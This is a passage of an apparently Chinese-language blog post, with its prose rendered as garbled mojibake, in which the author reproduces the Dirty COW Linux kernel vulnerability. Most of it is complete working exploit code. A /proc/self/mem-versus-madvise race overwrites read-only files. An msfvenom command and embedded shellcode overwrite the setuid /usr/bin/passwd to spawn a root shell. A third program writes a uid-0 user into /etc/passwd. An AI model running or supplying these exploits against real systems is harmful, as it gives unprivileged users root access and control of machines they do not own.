class="hljs-string">&lt;pthread.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/stat.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/sem.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;semaphore.h&gt;</span></span><br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">stat</span> <span class="hljs-title">dest_st</span>, <span class="hljs-title">fake_st</span>;</span><br><span class="hljs-type">void</span> *mem;<br><span class="hljs-type">int</span> mem_fd, dest_fd, fake_fd;<br><span class="hljs-type">char</span> *fake_data;<br><span class="hljs-type">pthread_t</span> mem_pthread, madvise_pthread;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">err_exit</span><span class="hljs-params">(<span class="hljs-type">char</span> *msg)</span><br>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[31m\033[1m[x] Error at: \033[0m%s\n&quot;</span>, msg);<br>    sleep(<span class="hljs-number">5</span>);<br>    <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>&#125;<br>                                 <br><span class="hljs-type">void</span> * <span class="hljs-title function_">mem_func</span><span class="hljs-params">()</span><br>&#123;<br>    mem_fd = open(<span class="hljs-string">&quot;/proc/self/mem&quot;</span>, O_RDWR);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">0x100000</span>; i++)<br>    &#123;<br>        lseek(mem_fd, (<span class="hljs-type">off_t</span>) mem, SEEK_SET);<br>        write(mem_fd, fake_data, <span class="hljs-number">0x1000</span>);<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>&#125;<br><br><span class="hljs-type">void</span> * <span class="hljs-title function_">madvise_func</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i&lt; <span class="hljs-number">0x100000</span>; i++)<br>    &#123;<br>        madvise(mem, <span class="hljs-number">0x100</span>, MADV_DONTNEED);<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> ** argv)</span><br>&#123;<br>    <span class="hljs-keyword">if</span> (argc != <span class="hljs-number">3</span>)<br>        err_exit(<span class="hljs-string">&quot;pls usage ./exp destination_file fake_file&quot;</span>);<br>    <br><span class="hljs-comment">//open &amp; read fake file</span><br>    fake_fd = open(argv[<span class="hljs-number">2</span>], O_RDONLY);<br>    fstat(fake_fd, &amp;fake_st);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;fake_fd is %d\n&quot;</span>, fake_fd);<br>    fake_data = <span class="hljs-built_in">malloc</span>(fake_st.st_size);<br>    read(fake_fd, fake_data, fake_st.st_size);<br><br><span class="hljs-comment">//open dest file   </span><br>    dest_fd = open(argv[<span class="hljs-number">1</span>], O_RDONLY);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;dest_fd is %d\n&quot;</span>, dest_fd);<br>    fstat(dest_fd, &amp;dest_st);<br>    mem = mmap(<span class="hljs-literal">NULL</span>, dest_st.st_size, PROT_READ, MAP_PRIVATE, dest_fd, <span class="hljs-number">0</span>);<br><br>    pthread_create(&amp;mem_pthread, <span class="hljs-literal">NULL</span>, mem_func, <span class="hljs-literal">NULL</span>);<br>    pthread_create(&amp;madvise_pthread, <span class="hljs-literal">NULL</span>, madvise_func, <span class="hljs-literal">NULL</span>);<br><br>    pthread_join(mem_pthread, <span class="hljs-literal">NULL</span>);<br>    pthread_join(madvise_pthread, <span class="hljs-literal">NULL</span>);<br>    <br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><br></code></pre></td></tr></table></figure>

<p>å¯ä»¥çœ‹åˆ°å¯¹äºæ™®é€šç”¨æˆ·åªæœ‰åªè¯»æƒé™çš„æ–‡ä»¶ï¼Œå·²ç»å¯ä»¥è¦†å†™äº†</p>
<p>é‚£ä¹ˆæ¥ä¸‹æ¥å°±èƒ½è¿›è¡Œä¸€äº›<del>å˜¿å˜¿å˜¿ğŸ¥µğŸ¥µğŸ¥µ</del>çš„äº‹æƒ…äº†</p>
<p><img src="https://cdn.jsdelivr.net/gh/korey0sh1/clouding@master/data/20240306105004.png" srcset="/img/loading.gif" lazyload></p>
<h2 id="åˆ©ç”¨suidè¿›è¡Œææƒ"><a href="#åˆ©ç”¨suidè¿›è¡Œææƒ" class="headerlink" title="åˆ©ç”¨suidè¿›è¡Œææƒ"></a>åˆ©ç”¨suidè¿›è¡Œææƒ</h2><p>è¿™ä¸ªæ‰‹æ³•åœ¨æ¸—é€ä¸­ä¹Ÿæ˜¯å¾ˆå¸¸è§äº†ï¼Œåœ¨æ­¤å°±ä¸å†èµ˜è¿°äº†</p>
<p>åŸºæœ¬ä¸Šå°±æ˜¯åˆ©ç”¨dirtycowæŠŠå…·æœ‰suidçš„æ–‡ä»¶ç»™è¶Šæƒç¯¡æ”¹ï¼Œå†™è¿›ææƒçš„shellcodeï¼Œå†æ‰§è¡Œå°±å¥½äº†</p>
<h3 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h3><p><code>msf</code>ç”Ÿæˆ<code>shellcode</code></p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">msfvenom -p linux/x64/exec PrependSetuid=True -f elf | xxd -i<br></code></pre></td></tr></table></figure>



<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-meta">#<span class="hljs-keyword">define</span> _GNU_SOURCE</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/mman.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;pthread.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/stat.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/sem.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;semaphore.h&gt;</span></span><br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">stat</span> <span class="hljs-title">dest_st</span>;</span><br><span class="hljs-type">void</span> *mem;<br><span class="hljs-type">int</span> data_len = <span class="hljs-number">149</span>;<br><span class="hljs-type">pthread_t</span> mem_pthread, madvise_pthread;<br><span class="hljs-type">int</span> dest_fd, fake_fd, mem_fd;<br><br><span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> attack_data[] = &#123;<br>  <span class="hljs-number">0x7f</span>, <span class="hljs-number">0x45</span>, <span class="hljs-number">0x4c</span>, <span class="hljs-number">0x46</span>, <span class="hljs-number">0x02</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>,<br>  <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x02</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x3e</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>,<br>  <span class="hljs-number">0x78</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x40</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x40</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>,<br>  <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>,<br>  <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x40</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x38</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>,<br>  <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x07</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>,<br>  <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x40</span>, <span class="hljs-number">0x00</span>,<br>  <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x40</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>,<br>  <span class="hljs-number">0x95</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xb2</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>,<br>  <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x10</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>,<br>  <span class="hljs-number">0x48</span>, <span class="hljs-number">0x31</span>, <span class="hljs-number">0xff</span>, <span class="hljs-number">0x6a</span>, <span class="hljs-number">0x69</span>, <span class="hljs-number">0x58</span>, <span class="hljs-number">0x0f</span>, <span class="hljs-number">0x05</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0xb8</span>, <span class="hljs-number">0x2f</span>, <span class="hljs-number">0x62</span>,<br>  <span class="hljs-number">0x69</span>, <span class="hljs-number">0x6e</span>, <span class="hljs-number">0x2f</span>, <span class="hljs-number">0x73</span>, <span class="hljs-number">0x68</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x99</span>, <span class="hljs-number">0x50</span>, <span class="hljs-number">0x54</span>, <span class="hljs-number">0x5f</span>, <span class="hljs-number">0x52</span>, <span class="hljs-number">0x5e</span>,<br>  <span class="hljs-number">0x6a</span>, <span class="hljs-number">0x3b</span>, <span class="hljs-number">0x58</span>, <span class="hljs-number">0x0f</span>, <span class="hljs-number">0x05</span><br>&#125;;<br><br><span class="hljs-type">void</span> * <span class="hljs-title function_">mem_func</span><span class="hljs-params">(<span class="hljs-type">void</span> * argv)</span><br>&#123;<br>    mem_fd = open(<span class="hljs-string">&quot;/proc/self/mem&quot;</span>, O_RDWR);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;mem_fd is %d\n&quot;</span>, mem_fd);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">0x100000</span>; i++)<br>    &#123;<br>       lseek(mem_fd, (<span class="hljs-type">off_t</span>) mem, SEEK_SET);<br>       write(mem_fd, attack_data, data_len);<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>&#125;<br><br><span class="hljs-type">void</span> * <span class="hljs-title function_">madvise_func</span><span class="hljs-params">(<span class="hljs-type">void</span> * argv)</span><br>&#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">0x100000</span>; i++)<br>    &#123;<br>        madvise(mem, <span class="hljs-number">0x100</span>, MADV_DONTNEED);<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> ** argv)</span><br>&#123;<br>    <br>    dest_fd = open(<span class="hljs-string">&quot;/usr/bin/passwd&quot;</span>, O_RDONLY);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;dest_fd is %d\n&quot;</span>, dest_fd);<br>    fstat(dest_fd, &amp;dest_st);<br>    mem = mmap(<span class="hljs-literal">NULL</span>, dest_st.st_size, PROT_READ, MAP_PRIVATE, dest_fd, <span class="hljs-number">0</span>);<br><br>    pthread_create(&amp;mem_pthread, <span class="hljs-literal">NULL</span>, mem_func, <span class="hljs-literal">NULL</span>);<br>    pthread_create(&amp;madvise_pthread, <span class="hljs-literal">NULL</span>, madvise_func, <span class="hljs-literal">NULL</span>);<br><br>    pthread_join(madvise_pthread, <span class="hljs-literal">NULL</span>);<br>    pthread_join(mem_pthread, <span class="hljs-literal">NULL</span>);<br>    <br>    <br>    <br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><br></code></pre></td></tr></table></figure>

<img src="https://cdn.jsdelivr.net/gh/korey0sh1/clouding@master/data/20240306190421.png" srcset="/img/loading.gif" lazyload style="zoom: 80%;" />

<p><strong>ç¢ç¢å¿µï¼š</strong></p>
<p>â€‹	é¦–å…ˆæˆ‘è¯•å›¾ç”¨<code>strlen</code>å®Œæˆå¯¹<code>shellcode</code>çš„è®¡æ•°ï¼Œä½†æ˜¯æ— è®ºå¦‚ä½•éƒ½æ— æ³•æˆåŠŸï¼Œä¼°è®¡æ˜¯<code>strlen</code>ä¼šå¯¹å†…å­˜ä¸­çš„é¡µå¸ƒå±€æœ‰å½±å“ğŸ¤”ï¼ˆå¦‚æœæœ‰å¸¦å¸ˆå‚…äº†è§£æ˜¯ä»€ä¹ˆåŸå› è¯·åŠ¡å¿…è”ç³»ä¸€ä¸‹é“¸å¸ç¬”è€…ï¼Œä¸èƒœæ„Ÿæ¿€å‘œå‘œå‘œğŸ˜­ğŸ˜­ğŸ˜­ï¼‰</p>
<p>â€‹	å…¶æ¬¡æ˜¯éšä¾¿æ‹‰äº†ä¸€ä¸ª<code>kernel</code>é¢˜çš„æ–‡ä»¶ç³»ç»Ÿï¼Œæ›¿æ¢äº†ä¸‹å†…æ ¸ä¾¿å……å½“æ¼æ´å¤ç°ç¯å¢ƒäº†ï¼Œç»“æœå…·æœ‰<code>suid</code>çš„æ–‡ä»¶åªæœ‰<code>busybox</code>ä¸€ä¸ªï¼Œè¿™ç©æ„æ ¹æœ¬è¦†å†™ä¸äº†ä¸€ç‚¹ï¼Œå†™å®Œç›´æ¥<code>kernel panic</code>ã€‚ç„¶åæ”¾äº†ä¸€ä¸ªæ‰‹åŠ¨èµ‹äºˆ<code>suid</code>çš„<code>test</code>ç¨‹åºè¿›å»ï¼Œè¦†å†™å®Œæ‰§è¡Œä¼š<code>segment fault</code>ã€‚æ— å¥ˆåªèƒ½ä¸‹äº†ä¸€ä¸ª<code>ubuntu14.04</code>ã€‚</p>
<p>â€‹	æœ€åä¾¿æ˜¯æå®Œæƒåï¼Œè¿‡ä¸€ä¼šä¼šï¼Œä¹Ÿä¼š<code>dump</code>æ‰ã€‚</p>
<h2 id="åˆ©ç”¨-etc-passwd-å®Œæˆææƒ"><a href="#åˆ©ç”¨-etc-passwd-å®Œæˆææƒ" class="headerlink" title="åˆ©ç”¨&#x2F;etc&#x2F;passwd&#x2F;å®Œæˆææƒ"></a>åˆ©ç”¨&#x2F;etc&#x2F;passwd&#x2F;å®Œæˆææƒ</h2><p>å¾€&#x2F;etc&#x2F;passwdæ–°æ·»ä¸€ä¸ªå…·æœ‰rootæƒé™çš„ç”¨æˆ·å³å¯</p>
<h3 id="poc-1"><a href="#poc-1" class="headerlink" title="poc"></a>poc</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> _GNU_SOURCE</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/mman.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;pthread.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/stat.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/sem.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;semaphore.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;crypt.h&gt;</span></span><br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">stat</span> <span class="hljs-title">dest_st</span>;</span><br><span class="hljs-type">void</span> *mem;<br><span class="hljs-type">pthread_t</span> mem_pthread, madvise_pthread;<br><span class="hljs-type">int</span> dest_fd, fake_fd, mem_fd;<br><span class="hljs-type">int</span> info_len;<br><span class="hljs-type">char</span> * info_data;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">passwd_info</span></span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-type">char</span> * name;<br>    <span class="hljs-type">char</span> * password;<br>    <span class="hljs-type">int</span> uid;<br>    <span class="hljs-type">int</span> gid;<br>    <span class="hljs-type">char</span> * info;<br>    <span class="hljs-type">char</span> * home_dir;<br>    <span class="hljs-type">char</span> * shell;<br>&#125;;<br><br><br><span class="hljs-type">void</span> * <span class="hljs-title function_">mem_func</span><span class="hljs-params">(<span class="hljs-type">void</span> * argv)</span><br>&#123;<br>    mem_fd = open(<span class="hljs-string">&quot;/proc/self/mem&quot;</span>, O_RDWR);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;mem_fd is %d\n&quot;</span>, mem_fd);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">0x100000</span>; i++)<br>    &#123;<br>       lseek(mem_fd, (<span class="hljs-type">off_t</span>) mem, SEEK_SET);<br>       write(mem_fd, info_data, info_len);<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>&#125;<br><br><span class="hljs-type">void</span> * <span class="hljs-title function_">madvise_func</span><span class="hljs-params">(<span class="hljs-type">void</span> * argv)</span><br>&#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">0x100000</span>; i++)<br>    &#123;<br>        madvise(mem, <span class="hljs-number">0x100</span>, MADV_DONTNEED);<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>&#125;<br><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> ** argv)</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">passwd_info</span> <span class="hljs-title">korey_info</span>;</span><br>    <br>    korey_info.name = <span class="hljs-string">&quot;korey&quot;</span>;<br>    korey_info.password = <span class="hljs-string">&quot;password&quot;</span>;<br>    korey_info.uid = <span class="hljs-number">0</span>;<br>    korey_info.gid = <span class="hljs-number">0</span>;<br>    korey_info.info = <span class="hljs-string">&quot;korey0sh1&#x27;s shell&quot;</span>;<br>    korey_info.home_dir = <span class="hljs-string">&quot;/root&quot;</span>;<br>    korey_info.shell = <span class="hljs-string">&quot;/bin/bash&quot;</span>;<br><br>    info_len = <span class="hljs-built_in">snprintf</span>(<span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>, <span class="hljs-string">&quot;%s:%s:%d:%d:%s:%s:%s\n&quot;</span>,<br>    korey_info.name,<br>    crypt(korey_info.password, korey_info.name),<br>    korey_info.uid,<br>    korey_info.gid,<br>    korey_info.info,<br>    korey_info.home_dir,<br>    korey_info.shell<br>    );<br><br>    info_data = <span class="hljs-built_in">malloc</span>(info_len + <span class="hljs-number">10</span>);<br>    <br>    <span class="hljs-built_in">sprintf</span>(info_data, <span class="hljs-string">&quot;%s:%s:%d:%d:%s:%s:%s\n&quot;</span>,<br>    korey_info.name,<br>    crypt(korey_info.password, korey_info.name),<br>    korey_info.uid,<br>    korey_info.gid,<br>    korey_info.info,<br>    korey_info.home_dir,<br>    korey_info.shell<br>    );<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;info is &quot;</span>);<br>    write(<span class="hljs-number">1</span>, info_data, info_len);<br><br><br>    dest_fd = open(<span class="hljs-string">&quot;/etc/passwd&quot;</span>, O_RDONLY);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;dest_fd is %d\n&quot;</span>, dest_fd);<br>    fstat(dest_fd, &amp;dest_st);<br>    mem = mmap(<span class="hljs-literal">NULL</span>, dest_st.st_size, PROT_READ, MAP_PRIVATE, dest_fd, <span class="hljs-number">0</span>);<br><br>    pthread_create(&amp;mem_pthread, <span class="hljs-literal">NULL</span>, mem_func, <span class="hljs-literal">NULL</span>);<br>    pthread_create(&amp;madvise_pthread, <span class="hljs-literal">NULL</span>, madvise_func, <span class="hljs-literal">NULL</span>);<br><br>    pthread_join(madvise_pthread, <span class="hljs-literal">NULL</span>);<br>    pthread_join(mem_pthread, <span class="hljs-literal">NULL</span>);<br>    <br>   <br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><br></code></pre></td></tr></table></figure>

<p><code>crypt.h</code>æ˜¯ä¸ªå¤–éƒ¨åº“ï¼Œæ‰€ä»¥ç¼–è¯‘çš„æ—¶å€™è¦æ‰‹åŠ¨åŠ ä¸ª<code>-lcrypt</code></p>
<p><img src="https://cdn.jsdelivr.net/gh/korey0sh1/clouding@master/data/20240306201207.png" srcset="/img/loading.gif" lazyload></p>
<p>è¿™ä¸ªå°±èˆ’æœå¤šäº†</p>
<h1 id="0xffï¼šå†™åœ¨æœ€å"><a href="#0xffï¼šå†™åœ¨æœ€å" class="headerlink" title="0xffï¼šå†™åœ¨æœ€å"></a>0xffï¼šå†™åœ¨æœ€å</h1><p>å‰åèŠ±äº†ä¸€å‘¨å·¦å³ï¼Œæ‰ç£•ç£•ç¢°ç¢°åœ°å¤ç°å®Œäº†è¿™ä¸ªå¤æ—©çš„<strong>CVE</strong></p>
